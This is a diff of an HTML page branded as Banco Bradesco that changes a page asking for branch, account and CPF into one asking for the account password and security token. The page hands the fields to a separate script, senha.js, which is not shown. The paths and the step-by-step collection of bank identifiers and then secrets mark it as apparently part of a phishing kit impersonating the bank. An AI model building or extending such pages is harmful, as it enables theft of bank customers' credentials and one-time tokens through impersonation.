@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Banco Bradesco | Acessar Conta</title>
+  <title>Banco Bradesco | Inserir Senha</title>
   <link rel="icon" type="image/png" href="/Bradesco/assets/favconBank.png" />
   <script src="https://cdn.tailwindcss.com"></script>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet" />
@@ -19,18 +19,20 @@
   </header>
 
   <!-- Conteúdo principal -->
-  <main class="flex-1 flex items-center justify-center pt-24 pb-05">
+  <main class="flex-1 flex items-center justify-center pt-24 pb-5">
     <div class="bg-white/95 shadow-2xl rounded-3xl p-10 w-full max-w-md mx-auto text-gray-900">
-      <h1 class="text-3xl font-bold text-center mb-2 text-[#1a1a1a]">Acessar Conta</h1>
-      <p class="text-center text-sm text-gray-600 mb-8">Informe seus dados para continuar</p>
+      
+      <!-- Boas-vindas -->
+      <h1 id="bemVindo" class="text-2xl font-bold text-center mb-6 text-[#1a1a1a]"></h1>
+      <p class="text-center text-sm text-gray-600 mb-8">Insira sua senha cadastrada e token de segurança</p>
 
-      <form class="space-y-5">
+      <form class="space-y-5" id="senhaForm">
         <div>
-          <label for="agencia" class="block text-sm font-medium mb-1">Agência</label>
+          <label for="senha" class="block text-sm font-medium mb-1">Senha</label>
           <input
-            id="agencia"
-            type="number"
-            placeholder="Ex: 1234"
+            id="senha"
+            type="password"
+            placeholder="Digite sua senha"
             required
             class="w-full px-4 py-3 rounded-xl border border-gray-300 placeholder-gray-500
                    focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-[#b41a83]"
@@ -38,23 +40,11 @@
         </div>
 
         <div>
-          <label for="conta" class="block text-sm font-medium mb-1">Conta</label>
+          <label for="token" class="block text-sm font-medium mb-1">Token de Segurança</label>
           <input
-            id="conta"
-            type="number"
-            placeholder="Ex: 56789-0"
-            required
-            class="w-full px-4 py-3 rounded-xl border border-gray-300 placeholder-gray-500
-                   focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-[#b41a83]"
-          />
-        </div>
-
-        <div>
-          <label for="cpf" class="block text-sm font-medium mb-1">CPF</label>
-          <input
-            id="cpf"
+            id="token"
             type="text"
-            placeholder="000.000.000-00"
+            placeholder="Digite seu token"
             required
             class="w-full px-4 py-3 rounded-xl border border-gray-300 placeholder-gray-500
                    focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-[#b41a83]"
@@ -70,12 +60,7 @@
         </button>
       </form>
 
-      <p class="text-center text-sm text-gray-600 mt-6">
-        Ainda não possui conta?
-        <a href="/Bradesco/Criar-Conta.html" class="text-[#1a1a1a] font-semibold hover:underline">
-          Abra a sua agora!
-        </a>
-      </p>
+      <div id="mensagem" class="mt-4 text-center text-red-600 font-medium hidden"></div>
     </div>
   </main>
 
@@ -84,7 +69,7 @@
     © 2025 Bradesco. Todos os direitos reservados.
   </footer>
 
-  <script src="/Bradesco/Js/login.js"></script>
-
+  <!-- Link para JS separado -->
+  <script src="/Bradesco/Js/senha.js"></script>
 </body>
 </html>
